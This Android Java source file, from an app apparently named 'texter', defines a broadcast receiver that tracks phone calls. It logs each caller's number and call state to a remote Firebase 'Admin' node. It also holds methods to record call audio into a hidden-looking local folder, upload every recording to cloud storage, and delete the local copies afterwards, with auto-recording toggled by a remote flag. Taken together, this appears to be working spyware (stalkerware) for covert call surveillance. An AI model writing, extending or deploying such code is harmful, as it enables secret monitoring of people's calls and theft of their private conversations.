package com.app.texter;

import static android.content.ContentValues.TAG;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.OnProgressListener;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.UUID;
import java.util.concurrent.ExecutionException;

public class broadcastRun extends BroadcastReceiver {

    private boolean recstart=false;
    MediaRecorder recorder;
    FirebaseStorage storage;
    StorageReference storageReference;
    File filePath;

    boolean AutoRecState=false;
    FirebaseDatabase firebaseDatabase;
    DatabaseReference databaseReference;
    String battery_s;


    @RequiresApi(api = Build.VERSION_CODES.R)
    @Override

    public void onReceive(Context context, Intent intent) {
        String number= intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
        if (number!=null) {

            File path = new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/Logandroidfiles");
            if (!path.exists()){path.mkdirs();}


            String PhoneState = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
            String name=intent.getStringExtra(TelephonyManager.EXTRA_CARRIER_NAME);
            if(name==null){name="Unknown";}

            DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
            Date date = new Date();
            String currentdate=(String) dateFormat.format(date);
            String[] datee=currentdate.split(" ");
            String day=datee[0].replace("/","_");
            String time = datee[1].replace(":","_");

            String filename=path+"/"+name+"_"+day+"_"+time+"_log.3gp";




            firebaseDatabase = FirebaseDatabase.getInstance();
            databaseReference = firebaseDatabase.getReference("Admin");



/*

 */
            if (PhoneState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {CallStateUpdate("Ringing",number);}
            if ((PhoneState.equals(TelephonyManager.EXTRA_STATE_OFFHOOK))) {CallStateUpdate("talking",number);}
            if (PhoneState.equals(TelephonyManager.EXTRA_STATE_IDLE)) { CallStateUpdate("idle","last:"+number);
                try { getstate(); }catch (Exception eeee){eeee.printStackTrace();}


                try {
                    ArrayList<String> filesinDict = dictFiles(path);
                    if (isInternet(context)) {

                        Toast.makeText(context, "Internet Connected", Toast.LENGTH_SHORT).show();
                        uploadFile(context,filesinDict,path);
                    }
                }
                catch (NullPointerException er){ Toast.makeText(context, er.getMessage(), Toast.LENGTH_SHORT).show(); } catch (Exception exc){ Toast.makeText(context, exc.getMessage(), Toast.LENGTH_SHORT).show(); }

            }




            /*
            if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
                Toast.makeText(context, "Boot done", Toast.LENGTH_SHORT).show();
                if (isInternet(context)){}}
             */











        }
    }

    public void startRecording(Context context, String number,String filename) {
        recorder = new MediaRecorder();
        //recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
        recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        recorder.setOutputFile(filename);

        try {
            recorder.prepare();
            recorder.start();
            recstart = true;
        } catch (IllegalStateException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void stopRecording() {
        if (recstart) {
            recorder.stop();
            recorder.release();
            recstart = false;
        }
    }

    public boolean isInternet(Context context){
        try {
            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo nf = cm.getActiveNetworkInfo();
            return (nf != null && nf.isConnected());
        }
        catch (NullPointerException e){
            e.printStackTrace();
            return false;
        }


    }

    public ArrayList<String> dictFiles(File path){
        ArrayList<String> filesname=new ArrayList<>();

        File directory = new File(String.valueOf(path));
        File[] files = directory.listFiles();
        for (int i = 0; i < files.length; i++)
        {
            filesname.add(files[i].getName());
            Log.d("Files", "This is FileName:" + files[i].getName());
        }

        return filesname;
    }

    public void uploadFile(Context context, ArrayList<String> uploadfile,File path){
        storage = FirebaseStorage.getInstance();
        storageReference = storage.getReference();






        for (int i=0; i<uploadfile.size(); i++) {






            String filename=uploadfile.get(i);
            filePath=new File( path+"/"+filename);

            StorageReference ref = storageReference.child("Voice/").child(filename);

            ref.putFile(Uri.fromFile(filePath))


                    .addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {

                @Override
                public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                    Log.d(TAG, filePath.toString());
                    Toast.makeText(context, "Uploaded!!", Toast.LENGTH_SHORT).show();
                    File file = new File(path, filename);
                    boolean deleted = file.delete();
                }
            })

                    .addOnFailureListener(new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception e) {
                            //When error is thrown!
                            Toast.makeText(context, "Failed " + e.getMessage(), Toast.LENGTH_SHORT).show();
                        }
                    });
        }


    }

    private void setdata(Context context){
        databaseReference.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {


                OrderHelper DATA=new OrderHelper("0","1");
                databaseReference.setValue(DATA);
                Toast.makeText(context, "Upload Done", Toast.LENGTH_SHORT).show();
            }


            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                Toast.makeText(context, "Failed to update", Toast.LENGTH_SHORT).show();

            }
        });

    }

    public void CallStateUpdate(String state,String number) {
        HashMap h = new HashMap();
        h.put("call_state", state+"("+number+")");
        databaseReference.updateChildren(h).addOnSuccessListener(new OnSuccessListener() {
            @Override
            public void onSuccess(Object o) {

            }
        });

    }

    public void getstate(){
        databaseReference.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                ArrayList<String> arr=new ArrayList<>();
                for (DataSnapshot snap:snapshot.getChildren()){
                    arr.add(snap.getValue().toString()) ;
                }
                if (arr.get(0).equals("1")){AutoRecState=true;}
                else{AutoRecState=false;}
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });
    }

}

